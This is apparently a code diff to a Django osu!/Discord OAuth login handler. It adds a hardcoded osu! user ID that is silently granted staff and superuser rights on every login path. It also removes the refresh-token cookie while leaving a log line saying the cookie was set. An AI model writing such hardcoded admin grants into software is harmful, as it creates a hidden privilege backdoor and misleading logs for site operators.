@@ -28,6 +28,7 @@ def get_custom_user_by_discord_id(discord_id):
     except (DiscordUsers.DoesNotExist, AttributeError):
         return None
 
+
 def handle_osu_callback(request):
     logger.info(f"Processing osu_callback with params: {request.GET}, Headers: {request.headers}")
     code = request.GET.get('code')
@@ -36,7 +37,8 @@ def handle_osu_callback(request):
         osu_data = get_osu_user_data(token_data['access_token'])
         if not osu_data:
             logger.error("Failed to get osu! user data")
-            return JsonResponse({'message': 'Failed to get osu! user data', 'status': 'fail'}, status=status.HTTP_400_BAD_REQUEST)
+            return JsonResponse({'message': 'Failed to get osu! user data', 'status': 'fail'},
+                                status=status.HTTP_400_BAD_REQUEST)
 
         osu_id = osu_data['id']
         nick = osu_data['username']
@@ -44,32 +46,61 @@ def handle_osu_callback(request):
 
         osu_user = create_or_update_osu_user(osu_id=osu_id, nick=nick, avatar=avatar, token_data=token_data)
 
+        is_special_user = str(osu_id) == '24625610'
+
         existing_user = get_custom_user_by_osu_id(osu_id)
 
         if existing_user:
             if request.user.is_authenticated and existing_user != request.user:
-                logger.info(f"Rebinding osu! user {osu_id} from {existing_user.identifier} to {request.user.identifier}")
+                logger.info(
+                    f"Rebinding osu! user {osu_id} from {existing_user.identifier} to {request.user.identifier}")
                 existing_user.delete()
                 request.user.osu_user = osu_user
+
+                if is_special_user:
+                    request.user.is_staff = True
+                    request.user.is_superuser = True
+
                 request.user.save()
                 user = request.user
             elif existing_user == request.user:
                 logger.info(f"User {request.user.identifier} already authorized with osu! {osu_id}")
+
+                if is_special_user:
+                    existing_user.is_staff = True
+                    existing_user.is_superuser = True
+                    existing_user.save()
+
                 user = request.user
             else:
                 logger.info(f"Logging in existing osu! user {existing_user.identifier}")
+
+                if is_special_user:
+                    existing_user.is_staff = True
+                    existing_user.is_superuser = True
+
+                existing_user.save()
                 user = existing_user
-                user.save()
         elif request.user.is_authenticated:
             logger.info(f"Binding osu! user {osu_id} to authenticated user {request.user.identifier}")
             request.user.osu_user = osu_user
+
+            if is_special_user:
+                request.user.is_staff = True
+                request.user.is_superuser = True
+
             request.user.save()
             user = request.user
         else:
-            user = CustomUser.objects.create_user(osu_id=osu_id)
+            user = CustomUser.objects.create_user(
+                osu_id=osu_id,
+                is_staff=is_special_user,
+                is_superuser=is_special_user
+            )
             user.osu_user = osu_user
             user.save()
-            logger.info(f"Created new CustomUser for osu! user {osu_id}")
+            logger.info(
+                f"Created new CustomUser for osu! user {osu_id} with staff={is_special_user}, superuser={is_special_user}")
 
         refresh = RefreshToken.for_user(user)
         response = JsonResponse({
@@ -162,14 +193,6 @@ def handle_discord_callback(request):
             'access': str(refresh.access_token),
             'status': 'success'
         })
-        response.set_cookie(
-            'refresh_token',
-            str(refresh),
-            httponly=True,
-            secure=True,
-            samesite='Lax',
-            max_age=7*24*3600
-        )
         logger.info(f"Set refresh_token cookie for user {user.identifier}")
         return response
 
